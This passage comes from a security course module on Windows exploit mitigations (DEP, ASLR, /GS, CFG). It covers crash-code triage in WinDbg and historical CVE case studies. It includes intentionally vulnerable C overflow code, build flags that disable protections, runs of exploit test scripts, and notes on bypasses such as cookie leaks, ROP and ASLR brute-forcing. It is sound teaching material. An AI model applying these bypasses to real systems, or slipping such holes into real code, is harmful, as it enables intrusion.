  - Run: `bin\dep_test.exe dep` -> Should crash with `0xc0000005` (execute violation)
- [ ] **Exercise G2**: ASLR breaks hardcoded ROP gadget addresses
  - Run: `python exploits\week5_aslr_test.py aslr_test.exe` -> Should fail with `0xc0000005`
  - Compare: `python exploits\check_aslr.py dep_test.exe` vs `python exploits\check_aslr.py aslr_test.exe`
- [ ] **Exercise G3**: /GS detects stack cookie corruption
  - Run: `python exploits\week5_gs_test.py gs_test.exe` -> Should fail with `0xc0000409`
  - Compare: `python exploits\week5_gs_test.py no_gs_test.exe` -> Should crash with `0xc0000005`
- [ ] **Exercise G4**: CFG blocks indirect calls to invalid targets
  - Run: `python exploits\week5_cfg_test.py cfg_test.exe` -> Should fail with `0x80000003` (NOT `0xc0000409`!)
  - Compare: `python exploits\week5_cfg_test.py no_cfg_test.exe` -> Should crash with `0xc0000005`
  - Note: CFG uses `__fastfail(10)` -> `int 0x29` -> exit code `0x80000003`, different from /GS!
- [ ] **Exercise G5**: Full protection blocks ALL exploit attempts
  - Run all three exploits against `full_protect_test.exe`
  - /GS exploits -> `0xc0000409`, CFG exploit -> `0x80000003` (different mitigations, different exit codes!)

**Completion Criteria**: You should be able to explain exactly why each of your Week 5 exploits fails against each mitigation level, and identify which mitigation caught the exploit by its exit code.

### Mitigation Interaction Matrix

| If Attacker Has...        | DEP Blocks | ASLR Blocks  | /GS Blocks | CFG Blocks |
| ------------------------- | ---------- | ------------ | ---------- | ---------- |
| Shellcode on stack        | +          | -            | -          | -          |
| Shellcode on heap         | +          | -            | -          | -          |
| Known libc address        | -          | +            | -          | -          |
| Stack overflow            | -          | -            | +          | -          |
| Heap overflow -> func ptr | -          | -            | -          | +          |
| ROP chain                 | -          | Partial      | -          | -          |
| Info leak                 | -          | Defeats ASLR | -          | -          |

### Crash Signature to Mitigation Mapping

**Bridge to Week 4 (Crash Analysis)**: When analyzing crashes, these signatures indicate which mitigation caused termination:

| Mitigation       | Process Exit Code | WinDbg Exception Code           | Key Indicators                                 | WinDbg Analysis                               | **Bypass in Week 8**                        |
| ---------------- | ----------------- | ------------------------------- | ---------------------------------------------- | --------------------------------------------- | ------------------------------------------- |
| **DEP**          | `0xC0000005`      | `0xC0000005` (Access Violation) | `EXCEPTION_PARAMETER1 = 8` (execute violation) | `!analyze -v` shows "DEP violation"           | **Task X: Userland Data-Only Attack**       |
| **/GS (Cookie)** | `0xC0000409`      | `0xC0000409` (subcode 2)        | Fast fail, process terminates immediately      | Bucket: `OVERRUN_STACK_BUFFER_*`              | **Day 3: Stack Cookie Bypass**              |
| **CFG**          | `0x80000003`      | `0xC0000409` (subcode 10)       | `FAST_FAIL_GUARD_ICALL_CHECK_FAILURE`          | Bucket: `FAIL_FAST_GUARD_ICALL_CHECK_FAILURE` | **Task X: Userland Data-Only Attack**       |
| **CET Shadow**   | `0x80000003`      | `0xC0000407`                    | `STATUS_CONTROL_STACK_VIOLATION`               | Shadow stack mismatch detected                | _Advanced: Data-Only or Race Conditions_    |
| **Heap Cookie**  | `0xC0000374`      | `0xC0000374` (Heap Corruption)  | Detected on HeapFree/HeapAlloc                 | `!heap -p -a <addr>` shows corruption         | **Day 5: Heap Exploitation (Safe-Linking)** |

> [!WARNING]
> **Exit Code vs Exception Code**: Python's `process.returncode`, `%ERRORLEVEL%`, and `echo $LASTEXITCODE`
> show the **process exit code**. WinDbg's `.exr -1` and `!analyze -v` show the **exception code**.
> CFG and CET both call `__fastfail()` which executes `int 0x29` -> process exits with `0x80000003`
> (STATUS_BREAKPOINT), but the exception record INSIDE WinDbg preserves the original status.

**Quick WinDbg Triage**:

```bash
# After crash, identify mitigation:
!analyze -v

# Check exception parameters for DEP:
.exr -1
# Parameter1: 0 = read, 1 = write, 8 = DEP (execute)

# For fast fail codes:
# Look in exception record for subcode
# 10 = CFG, 37 = CET shadow stack, etc.
```

### The "Mitigation Failure Card"

In previous weeks, you created "Crash Cards". In Week 6, you must complete a **Mitigation Failure Card** for every blocked exploit.

> **MITIGATION FAILURE CARD**
>
> **Exploit Attempted**: Stack Overflow (150 bytes into 64-byte buffer)
> **Target Binary**: `bin\gs_test.exe`
> **Crash Symptom**: Process terminated immediately, no shellcode execution
> **Exception Code**: `0xC0000409` (STATUS_STACK_BUFFER_OVERRUN)
> **Failure Subcode/Param**: Stack Cookie corruption detected
> **WinDbg Bucket**: `FAIL_FAST_STACK_BUFFER_OVERRUN`
> **Why it Failed**: The stack cookie (placed between buffer and return address) was corrupted by the overflow. `__security_check_cookie()` detected the mismatch and called `__fastfail()`.
> **Potential Bypass**: Info leak to read cookie value, then include correct cookie in payload. Or target a function without /GS protection.

### Data-Only Attack Mitigation Evasion

| Attack Type               | DEP Blocks | ASLR Blocks  | /GS Blocks | CFG Blocks |
| ------------------------- | ---------- | ------------ | ---------- | ---------- |
| Shellcode on stack        | +          | -            | -          | -          |
| Shellcode on heap         | +          | -            | -          | -          |
| Known libc address        | -          | +            | -          | -          |
| Stack overflow            | -          | -            | +          | -          |
| Heap overflow -> func ptr | -          | -            | -          | +          |
| ROP chain                 | -          | Partial      | -          | -          |
| Info leak                 | -          | Defeats ASLR | -          | -          |
| Data-Only Attack          | -          | -            | -          | -          |

**Why This Matters**: In real-world analysis, you often start with a crash dump. Knowing these signatures lets you immediately identify:

1. Whether exploitation was attempted
2. Which mitigation stopped it
3. What the attacker was trying to do

### Data Execution Prevention (DEP) / NX bit

**What is DEP?**:

- Marks memory pages as non-executable
- Prevents code execution on stack and heap
- Also called NX (No eXecute) on Linux, W^X elsewhere

**How DEP Works**:

```text
Without DEP:
Memory Page: Read + Write + Execute (RWX)
- Stack: RWX
- Heap: RWX
- Data: RWX
-> Shellcode anywhere can execute

With DEP:
Memory Page: Read + Write OR Execute (never both)
- Stack: RW (no execute)
- Heap: RW (no execute)
- .text section: RX (read + execute only)
- Data section: RW (no execute)
-> Shellcode on stack/heap cannot execute
```

**DEP Policies**:

```bash
# Run in powershell
switch ((Get-CimInstance Win32_OperatingSystem).DataExecutionPrevention_SupportPolicy) {
  0 { 'AlwaysOff' }
  1 { 'AlwaysOn' }
  2 { 'OptIn' }
  3 { 'OptOut' }
  default { 'Unknown' }
}
# Example output: OptIn
```

#### Deep Dive: DEP at the Hardware Level

**The NX Bit in Page Table Entries**:

Understanding DEP requires understanding how the CPU enforces it through page tables.

```text
x64 Page Table Entry (PTE) Structure:
┌────────────────────────────────────────────────────────────┐
│ 63│62-52│51-M│M-12│11-9│ 8 │ 7 │ 6 │ 5 │ 4 │ 3 │ 2 │ 1 │ 0 │
├───┼─────┼────┼────┼────┼───┼───┼───┼───┼───┼───┼───┼───┼───┤
│NX │Avail│Rsv │PFN │Avl │G  │PAT│D  │A  │PCD│PWT│U/S│R/W│P  │
└───┴─────┴────┴────┴────┴───┴───┴───┴───┴───┴───┴───┴───┴───┘

Key Bits:
- Bit 63 (NX): No-Execute bit
  - 0 = Page is executable
  - 1 = Page is NOT executable (DEP enforced)
- Bit 0 (P): Present bit
- Bit 1 (R/W): Read/Write permission
- Bit 2 (U/S): User/Supervisor (ring 3/ring 0)

DEP Enforcement:
1. CPU fetches instruction
2. MMU translates virtual -> physical address
3. MMU reads PTE for that page
4. If NX bit is SET and page is in data segment:
   -> #PF (Page Fault) with specific error code
   -> Windows converts to STATUS_ACCESS_VIOLATION
```

**Page Protection Constants**:

```c
// Windows memory protection constants (memoryapi.h)
#define PAGE_NOACCESS           0x01
#define PAGE_READONLY           0x02
#define PAGE_READWRITE          0x04
#define PAGE_WRITECOPY          0x08
#define PAGE_EXECUTE            0x10    // Rarely used alone
#define PAGE_EXECUTE_READ       0x20    // Code sections
#define PAGE_EXECUTE_READWRITE  0x40    // JIT, dangerous
#define PAGE_EXECUTE_WRITECOPY  0x80

// Relationship to NX bit:
// PAGE_READWRITE         -> NX bit SET (non-executable)
// PAGE_EXECUTE_READ      -> NX bit CLEAR (executable)
// PAGE_EXECUTE_READWRITE -> NX bit CLEAR (JIT requirement)
```

**WinDbg Lab: Examining Page Protections**:

```bash
# Step 1: Attach to a process
# start notepad, run windbg and attach to it

# Step 2: View all memory regions with protections
!address

# Sample output (truncated - full output shows all loaded modules):
#          BaseAddress      EndAddress+1        RegionSize     Type       State                 Protect             Usage
# --------------------------------------------------------------------------------------------------------------------------
# +        0`7ffe0000        0`7ffe1000        0`00001000 MEM_PRIVATE MEM_COMMIT  PAGE_READONLY                      Other      [User Shared Data]
# +       c1`902f9000       c1`90300000        0`00007000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Stack      [~0; 11f0.2bcc]
# +     7ff7`966d0000     7ff7`966d1000        0`00001000 MEM_IMAGE   MEM_COMMIT  PAGE_READONLY                      Image      [Notepad.exe]
# +     7ff7`966d1000     7ff7`96876000        0`001a5000 MEM_IMAGE   MEM_COMMIT  PAGE_EXECUTE_READ                  Image      [Notepad.exe]
#                                                                                 ↑ Code section     ↑ Stack - no execute
```

**Step 3: Examine Specific Memory Regions**

Test these addresses to understand DEP protection:

```bash
# Stack memory (where buffer overflows occur)
0:004> !vprot c1`902f9000
BaseAddress:       000000c1902f9000
AllocationBase:    000000c190200000
AllocationProtect: 00000004  PAGE_READWRITE
RegionSize:        0000000000007000
State:             00001000  MEM_COMMIT
Protect:           00000004  PAGE_READWRITE    # ← NO EXECUTE - DEP protected!
Type:              00020000  MEM_PRIVATE

# Executable code section (.text)
0:004> !vprot 7ff7`966d1000
BaseAddress:       00007ff7966d1000
AllocationBase:    00007ff7966d0000
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
RegionSize:        00000000001a5000
State:             00001000  MEM_COMMIT
Protect:           00000020  PAGE_EXECUTE_READ  # ← Executable but NOT writable
Type:              01000000  MEM_IMAGE

# Heap memory
0:004> !vprot 283`f5000000
BaseAddress:       00000283f5000000
AllocationBase:    00000283f5000000
AllocationProtect: 00000004  PAGE_READWRITE
RegionSize:        0000000000002000
State:             00001000  MEM_COMMIT
Protect:           00000004  PAGE_READWRITE    # ← NO EXECUTE - DEP protected!
Type:              00020000  MEM_PRIVATE
```

**Step 4: Check Current Stack Pointer**

```bash
# Get current stack pointer
0:004> r rsp
rsp=000000c1906ffcb8

# Verify it's in non-executable memory
0:004> !vprot 000000c1906ffcb8
BaseAddress:       000000c1906ff000
AllocationBase:    000000c190600000
AllocationProtect: 00000004  PAGE_READWRITE
RegionSize:        0000000000001000
State:             00001000  MEM_COMMIT
Protect:           00000004  PAGE_READWRITE    # ← Stack is NEVER executable
Type:              00020000  MEM_PRIVATE
```

**Summary Table - W^X (Write XOR Execute) in Action:**

| Region           | Address Example | Writable | Executable | Attack Vector?        |
| ---------------- | --------------- | :------: | :--------: | --------------------- |
| Stack            | `c1`902f9000`   |    +     |     -      | ROP gadgets only      |
| Code (.text)     | `7ff7`966d1000` |    -     |     +      | Source of ROP gadgets |
| PE Header        | `7ff7`966d0000` |    -     |     -      | None                  |
| Heap             | `283`f5000000`  |    +     |     -      | Data-only attacks     |
| User Shared Data | `7ffe0000`      |    -     |     -      | Info leak source      |

> [!IMPORTANT]
> **DEP Takeaway**: No memory region is both Writable AND Executable simultaneously.
> This is why classic shellcode injection fails and attackers must use ROP chains.

**Why Some Processes Need Executable Data**:

```text
Legitimate uses of PAGE_EXECUTE_READWRITE:
1. JIT Compilers (JavaScript V8, .NET CLR, Java HotSpot)
   - Generate code at runtime
   - Must write then execute

2. Self-modifying code (rare, legacy)

3. Packers/Protectors (unpack code into memory)

Modern JIT approach (W^X compliant):
1. Allocate PAGE_READWRITE
2. Write generated code
3. VirtualProtect -> PAGE_EXECUTE_READ
4. Execute
5. Never have RWX simultaneously

Browser sandboxes enforce this strictly:
- Chrome: renderer processes cannot create RWX memory
- ACG (Arbitrary Code Guard) blocks VirtualProtect to +X
```

**Per-Process DEP Configuration**:

```bash
# View DEP settings
Get-ProcessMitigation -System

# View for specific process
Get-Process notepad -ErrorAction SilentlyContinue | ForEach-Object { Get-ProcessMitigation -Id $_.Id }

# Set DEP for program
Set-ProcessMitigation -Name myapp.exe -Enable DEP, SEHOP
```

#### Testing DEP

**Testing DEP with the Unified Suite**:

We use the `vulnerable_suite_win_mitigated.c` from the start of this lab (see Line ~450). The suite's **Option 1 (Stack Overflow)** triggers the `vuln_stack()` function which attempts to execute shellcode placed on the stack—DEP should block this.

**Compile WITHOUT DEP** (for comparison):

```bash
# x64 Native Tools Command Prompt
cd C:\Windows_Mitigations_Lab

# Build WITHOUT DEP (NXCOMPAT:NO) - shellcode MAY execute
cl /GS- /D_CRT_SECURE_NO_WARNINGS src\vulnerable_suite_win_mitigated.c /Fe:bin\dep_test_disabled.exe /link /NXCOMPAT:NO /DYNAMICBASE:NO /FIXED

# Verify DEP is disabled:
dumpbin /headers bin\dep_test_disabled.exe | findstr "NX"
# Should NOT show "NX compatible"

# Run and select Option 1 (Stack Overflow)
.\bin\dep_test_disabled.exe stack
# Enter long input to trigger overflow - may crash differently without DEP
```

**Compile WITH DEP** (default, recommended):

```bash
# Build WITH DEP enabled (NXCOMPAT) but WITHOUT ASLR (to isolate DEP testing)
cl /GS- /D_CRT_SECURE_NO_WARNINGS src\vulnerable_suite_win_mitigated.c /Fe:bin\dep_test.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED

# Verify DEP is enabled:
dumpbin /headers bin\dep_test.exe | findstr "NX"
# Should show: "NX compatible"

# Run and select Option 1 (Stack Overflow)
.\bin\dep_test.exe stack
# When prompted, enter 100+ 'A' characters to overflow the buffer
# DEP will block execution of any shellcode on the stack
```

**Verify DEP in WinDbg**:

```bash
# Launch the DEP-enabled binary in WinDbg with 'stack' argument
windbg C:\Windows_Mitigations_Lab\bin\dep_test.exe stack

# Set breakpoint on vuln_stack function (will be deferred until module loads)
1:001> bp dep_test!vuln_stack
Bp expression 'dep_test!vuln_stack' could not be resolved, adding deferred bp
1:001> g

# When initial break hits, check stack page protections
0:000> !vprot @rsp
BaseAddress:       000000000014f000
AllocationBase:    0000000000050000
AllocationProtect: 00000004  PAGE_READWRITE
RegionSize:        0000000000001000
State:             00001000  MEM_COMMIT
Protect:           00000004  PAGE_READWRITE   # <-- No EXECUTE permission!
Type:              00020000  MEM_PRIVATE

# Continue execution - the overflow will corrupt the return address
0:000> g
(13fc.634): Access violation - code c0000005 (first chance)
dep_test+0x1078:
00000001`40001078 c3              ret

# Analyze the crash
0:000> !analyze -v
EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - Access violation
EXCEPTION_PARAMETER1:  0000000000000000  # 0 = Read, 1 = Write, 8 = DEP/Execute
EXCEPTION_PARAMETER2:  ffffffffffffffff  # Invalid address from corrupted return

# The stack shows the overflow pattern (0x61 = 'a', cyclic pattern)
STACK_TEXT:
00000000`0014fee8 61616174`61616173 : dep_test+0x1078  # Corrupted return address!
```

> [!NOTE]
> **Understanding the Crash**: This crash is a **read violation** (EXCEPTION_PARAMETER1=0) because the corrupted return address points to unmapped memory.
> If we had actual shellcode and the return address pointed to the stack, we would see EXCEPTION_PARAMETER1=**8** (DEP/execute violation).
> The key observation is that `!vprot @rsp` shows `PAGE_READWRITE` without execute permission—DEP is working!

### Address Space Layout Randomization (ASLR)

**What is ASLR?**:

- Randomizes base addresses of executables and DLLs
- Makes it hard to predict code/data locations
- Defeats hardcoded address exploitation
- Enabled by `/DYNAMICBASE` linker flag

**What ASLR Randomizes**:

- Executable base address (if /DYNAMICBASE)
- DLL base addresses
- Stack location
- Heap location
- PEB/TEB location

**ASLR Entropy** (Windows 11 x64):

> [!NOTE]
> Entropy values are **approximate** and vary by Windows build, configuration, and specific mitigation policies. Use these as rough guidelines for understanding the scale of randomization.

- Executables: ~17 bits (128K possibilities)
- DLLs: ~19 bits (512K possibilities)
- Stack: ~17 bits
- Heap: ~5 bits per allocation

#### Deep Dive: ASLR Implementation Internals

**How Windows Calculates Randomization**:

```text
ASLR Randomization Sources:
1. KeQueryPerformanceCounter() - high-resolution timer
2. Process creation time
3. System boot time (stored in SharedUserData)
4. Per-boot random seed (KeRandomSeed)

Formula (simplified):
ImageBase = PreferredBase + (RandomValue * AllocationGranularity)

Where:
- PreferredBase: From PE header (usually 0x140000000 for x64)
- RandomValue: Derived from entropy sources
- AllocationGranularity: 64KB (0x10000)
```

**ASLR Entropy Breakdown by Component**:

```text
Windows 11 x64 ASLR Entropy:
┌─────────────────────────────────────────────────────────────────┐
│ Component          │ Bits │ Possible Values │ Notes             │
├────────────────────┼──────┼─────────────────┼───────────────────┤
│ Executable (EXE)   │  17  │     131,072     │ /HIGHENTROPYVA    │
│ DLLs               │  19  │     524,288     │ Per-DLL random    │
│ Stack              │  17  │     131,072     │ Per-thread        │
│ Heap               │   5  │          32     │ Per-allocation    │
│ PEB/TEB            │   8  │         256     │ Process/thread    │
│ Kernel (KASLR)     │  24  │  16,777,216     │ At boot only      │
└─────────────────────────────────────────────────────────────────┘

x86 (32-bit) - Much less entropy:
┌─────────────────────────────────────────────────────────────────┐
│ Component          │ Bits │ Possible Values │ Notes             │
├────────────────────┼──────┼─────────────────┼───────────────────┤
│ Executable (EXE)   │   8  │         256     │ Limited by VA     │
│ DLLs               │   8  │         256     │ Brute-forceable   │
│ Stack              │  14  │      16,384     │ Better than EXE   │
│ Heap               │   5  │          32     │ Same as x64       │
└─────────────────────────────────────────────────────────────────┘
```

**High Entropy ASLR (/HIGHENTROPYVA)**:

```bash
# Check if binary uses high entropy ASLR
cd c:\Windows_Mitigations_Lab>
dumpbin /headers bin\aslr_test.exe|findstr "High Entropy"
# shows High Entropy Virtual Addresses
```

**WinDbg Lab: Observing ASLR Randomization**:

```bash
# IMPORTANT: ASLR Behavior is More Nuanced Than "Reboot-Only"
#
# ASLR uses a per-boot random seed for base address calculation.
# However, some module bases may appear stable within a boot session due to:
# - Shared DLL mappings across processes (performance optimization)
# - Kernel address space layout caching
# - ForceRelocateImages policy (can change this behavior)
#
# DO NOT rely on any predictable behavior for exploitation!
# Always measure empirically in your specific environment.

# Method 1: Compare module bases across reboots
# ---------------------------------------------
windbg notepad.exe
lm m ntdll
# Note ntdll base address (e.g., 0x7ffb12340000)

# Reboot VM and repeat
# ntdll base should be different (new per-boot seed)

# Method 2: Compare across process launches (within same boot)
# ------------------------------------------------------------
# NOTE: Behavior varies based on:
# - ForceRelocateImages policy (if enabled, more randomization)
# - Whether DLL is already mapped by another process
# - System configuration and Windows version

windbg notepad.exe
lm m notepad
# Note base

.restart
lm m notepad
# Base may or may not change - this is environment-dependent!

# Method 3: Force per-launch randomization (recommended for security)
# -------------------------------------------------------------------
Set-ProcessMitigation -Name notepad.exe -Enable ForceRelocateImages
# Now each launch should get a different EXE base

# To verify:
for /L %i in (1,1,5) do @powershell -c "(Get-Process notepad -ErrorAction SilentlyContinue).MainModule.BaseAddress"
```

**ASLR Weaknesses (Understanding Limitations)**:

```text
ASLR Limitation 1: Shared DLL Base Addresses
--------------------------------------------
Within a boot session, all processes share same DLL bases.
If attacker leaks ntdll.dll base from ANY process,
they know it for ALL processes until reboot.

ASLR Limitation 2: Information Leaks
------------------------------------
Any pointer disclosure defeats ASLR for that module:
- printf() with %p on user data
- Stack traces in error messages
- Uninitialized memory disclosure
- Side-channel attacks (cache timing)

ASLR Limitation 3: Partial Overwrites
-------------------------------------
If overflow only corrupts low bytes of pointer:
- High bytes stay randomized
- Low bytes can redirect within same page
- Example: Change function to different offset

ASLR Limitation 4: Low Entropy (32-bit)
---------------------------------------
8 bits = 256 possibilities
At 1000 attempts/second = ~4 minutes average
Remote attacks with reconnection can brute-force
```

**Testing ASLR with the Unified Suite**:

> [!NOTE]
> To observe ASLR in action, we'll use WinDbg to examine module base addresses. The `vulnerable_suite_win_mitigated.c` binary itself doesn't print addresses, but WinDbg's `lm` command shows where modules are loaded.

**Compile WITH ASLR** (recommended):

```bash
# x64 Native Tools Command Prompt
cd C:\Windows_Mitigations_Lab

# Build WITH ASLR (DYNAMICBASE) and High Entropy
cl /GS- /D_CRT_SECURE_NO_WARNINGS src\vulnerable_suite_win_mitigated.c /Fe:bin\aslr_test.exe /link /NXCOMPAT /DYNAMICBASE /HIGHENTROPYVA

# Verify ASLR is enabled:
dumpbin /headers bin\aslr_test.exe | findstr "Dynamic base"
# Should show: "Dynamic base"

dumpbin /headers bin\aslr_test.exe | findstr "High Entropy"
# Should show: "High Entropy Virtual Addresses"
```

**Compile WITHOUT ASLR** (for comparison):

```bash
# Build WITHOUT ASLR (DYNAMICBASE:NO /FIXED)
cl /GS- /D_CRT_SECURE_NO_WARNINGS src\vulnerable_suite_win_mitigated.c /Fe:bin\no_aslr_test.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED

# Verify ASLR is disabled:
dumpbin /headers bin\no_aslr_test.exe | findstr "Dynamic base"
# Should NOT show "Dynamic base"
```

**Observe ASLR with WinDbg**:

```bash
# Launch the ASLR-enabled binary in WinDbg
windbg bin\aslr_test.exe stack

# In WinDbg, list loaded modules:
0:000> lm
# Note the base addresses for aslr_test and ntdll

# Close WinDbg and launch again:
windbg bin\aslr_test.exe stack
0:000> lm
# Within the same boot session, bases MAY be the same (Windows optimization)

# REBOOT the VM, then launch again:
windbg bin\aslr_test.exe stack
0:000> lm
# Now addresses should be different!

# Compare with NO-ASLR binary:
windbg bin\no_aslr_test.exe stack
0:000> lm
# Executable base is ALWAYS 0x140000000 (predictable!)
```

### Checking Mitigation Status

**Using Process Explorer**:

1. Download Process Explorer from Sysinternals
2. Run as Administrator
3. View -> Select Columns -> Process Image tab
4. Enable: ASLR Enabled, DEP Status
5. View running processes with protection status

**Using dumpbin**:

```bash
# Check PE headers
dumpbin /headers .\bin\aslr_test.exe | findstr "Dynamic base"
# "Dynamic base" present = ASLR enabled

dumpbin /headers .\bin\dep_test.exe | findstr "NX compatible"
# "NX compatible" present = DEP enabled
```

**Programmatic Detection**:

```c
// c:\Windows_Mitigations_Lab\src\mitigation.c
// compile with cl src\detection.c /Fe:bin\detection.exe /link
#include <windows.h>
#include <stdio.h>

void check_dep() {
    // Check hardware NX support
    if (IsProcessorFeaturePresent(PF_NX_ENABLED)) {
        printf("[+] Hardware DEP supported\n");
    }

    // Check if enabled for current process
    DWORD flags;
    BOOL permanent;
    if (GetProcessDEPPolicy(GetCurrentProcess(), &flags, &permanent)) {
        printf("[+] DEP enabled: %s\n", flags ? "Yes" : "No");
        printf("[+] Permanent: %s\n", permanent ? "Yes" : "No");
    }
}

void check_aslr() {
    HMODULE hExe = GetModuleHandle(NULL);
    printf("[*] Base address: %p\n", hExe);

    // Check if likely randomized
    // Non-randomized bases are often at 0x00400000 or similar
    if ((ULONG_PTR)hExe < 0x10000000) {
        printf("[-] Likely NOT randomized (low address)\n");
    } else {
        printf("[+] Likely randomized (high address)\n");
    }
}

int main() {
    printf("=== Mitigation Check ===\n\n");
    check_dep();
    printf("\n");
    check_aslr();
    return 0;
}
```

### CVE Case Studies: What DEP and ASLR Prevent

Understanding the historical attacks these mitigations stopped helps appreciate their value.

#### CVE-2008-4250: MS08-067 Conficker Worm (What DEP Prevents)

**The Attack (Pre-DEP era exploitation)**:

```text
Vulnerability: Stack buffer overflow in Server Service (netapi32.dll)
Target: Windows XP/2003 (many without DEP)
Impact: Remote code execution via SMB

Exploit Flow (without DEP):
1. Attacker sends malicious SMB request
2. Stack buffer overflow in svchost.exe
3. Return address overwritten -> points to stack
4. Shellcode on stack executes
5. Worm propagates to next target

Why DEP Would Block:
- Stack marked non-executable
- Return to stack shellcode fails
- Attack limited to DoS without ROP
```

**Lesson**: DEP would have significantly hindered Conficker's propagation.

#### CVE-2010-3962: IE Aurora Attack (What ASLR Prevents)

**The Attack (Operation Aurora)**:

```text
Vulnerability: Use-after-free in mshtml.dll (IE 6)
Target: IE 6 on Windows XP (no ASLR)
Impact: Targeted attack against Google employees

Exploit Flow (without ASLR):
1. Malicious webpage triggers UAF
2. Heap spray at predictable address (0x0c0c0c0c)
3. Shellcode at known location
4. ROP gadgets at known DLL offsets
5. Code execution achieved

Why ASLR Would Block:
- Heap spray address unpredictable
- DLL gadget addresses unknown
- Attacker needs information leak first
```

**Lesson**: ASLR forces attackers to chain vulnerabilities (info leak + code exec).

#### CVE-2021-40444: MSHTML RCE (Modern Attack - Mitigations Active)

**How Modern Mitigations Affected the Exploit**:

```text
Vulnerability: MSHTML URL protocol handler
Impact: RCE via malicious Office document
Mitigations Present: DEP, ASLR, CFG

Attacker's Challenge:
1. Cannot use simple shellcode (DEP)
2. Cannot hardcode addresses (ASLR)
3. Indirect calls validated (CFG)

Actual Exploit:
1. Used legitimate COM objects for initial execution
2. Launched CAB file to extract payload
3. DLL side-loading to bypass CFG
4. Used existing signed code for malicious actions

Lesson: Mitigations forced complex, multi-stage attack
```

### Practical Exercise

#### Task 1: Test DEP Protection

1. **Create vulnerable program**:

   ```c
   // Save as C:\Windows_Mitigations_Lab\src\dep_vuln.c
   // Simple buffer overflow with shellcode
   #include <stdio.h>
   #include <string.h>

   char shellcode[] = "\xcc\xc3";  // int3; ret

   int main() {
       char buffer[100];
       fgets(buffer, 200, stdin);  // Overflow
       void (*f)() = (void(*)())shellcode;
       f();  // Execute
       return 0;
   }
   ```

2. **Compile without DEP**:

   ```bash
   cd C:\Windows_Mitigations_Lab
   cl /GS- /D_CRT_SECURE_NO_WARNINGS src\dep_vuln.c /Fe:bin\dep_vuln_disabled.exe /link /NXCOMPAT:NO /DYNAMICBASE:NO
   ```

3. **Test - should execute**:

   ```bash
   echo AAAAAAA... | bin\dep_vuln_disabled.exe
   # Works (or int3 breakpoint)
   ```

4. **Recompile with DEP**:

   ```bash
   cl /GS- /D_CRT_SECURE_NO_WARNINGS src\dep_vuln.c /Fe:bin\dep_vuln_enabled.exe /link /NXCOMPAT /DYNAMICBASE:NO
   ```

5. **Test - should crash**:
   ```bash
   echo AAAAAAA... | bin\dep_vuln_enabled.exe
   # Access violation! (DEP blocks shellcode execution)
   ```

#### Task 2: Observe ASLR

1. **Compile check_aslr.c with ASLR**
2. **Run 5 times, note addresses**
3. **Reboot VM**
4. **Run 5 more times**
5. **Observe: addresses changed after reboot**

#### Task 3: Mitigation Detection

1. **Check Windows binaries**:

   ```bash
   dumpbin /headers C:\Windows\System32\notepad.exe | findstr "Dynamic NX"
   ```

2. **Check your compiled programs**
3. **Document which protections are active**

### Key Takeaways

1. **DEP prevents code execution**: Shellcode on stack/heap blocked
2. **ASLR randomizes addresses**: Hardcoded addresses don't work
3. **Both are foundational**: Required for modern exploitation
4. **Detection is straightforward**: Many tools available
5. **Crash Dumps Never Lie**: The Exception Record (`.exr -1`) tells you exactly WHICH mitigation killed the exploit.
6. **Hardware Matters**: The NX bit is a physical capability of the CPU; software just enables it.
7. **Circumvention is possible**: But requires advanced techniques (Week 8)

### Discussion Questions

1. What determines whether ASLR randomizes per-boot vs per-launch? (Hint: ForceRelocateImages, shared mappings)
2. What's the relationship between entropy and ASLR effectiveness?
3. How does DEP affect return-to-libc attacks? (It doesn't directly - why?)
4. Can ASLR and DEP be defeated individually, or must both be bypassed?
5. Why does ASLR require "PIE" (Position Independent Executable) to work fully?
6. If you have a buffer overflow on the stack, but DEP is on, why can't you just jump to your buffer?
7. How does an "Information Leak" defeat ASLR?
8. Why is `0xC0000005` with `Parameter[0]=8` the "smoking gun" for a DEP violation?

